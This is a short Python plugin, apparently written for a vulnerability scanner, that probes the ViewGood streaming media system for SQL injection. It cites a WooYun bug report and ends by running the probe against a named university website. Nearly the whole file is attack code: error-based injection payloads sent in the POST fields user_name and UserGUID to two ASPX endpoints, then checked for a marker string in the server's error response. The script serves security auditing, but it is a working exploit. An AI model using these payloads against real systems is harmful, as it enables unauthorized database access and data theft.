#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:远古流媒体系统最后2处POST注入漏洞#影响大量站点 
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0146427
#Author:xq17
import re
def assign(service, arg):
    if service == 'viewgood':
        return True, arg
def audit(arg):
    post='user_name=%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))>0--'
    target=arg+'viewgood/Pc/Content/Request.aspx?action=name_check'
    code, head, res, errcode, _ = curl.curl2(target,post=post) 
    if code == 500 and 'testXQ17' in res:
        security_hole(target)
    post='UserGUID=1%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))>0--'
    target=arg+'VIEWGOOD/ADI/portal/UserDataSync.aspx'
    code, head, res, errcode, _ = curl.curl2(target,post=post) 
    if code == 500 and 'testXQ17' in res:
        security_hole(target)
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('viewgood','http://tv.luas.edu.cn/')[1])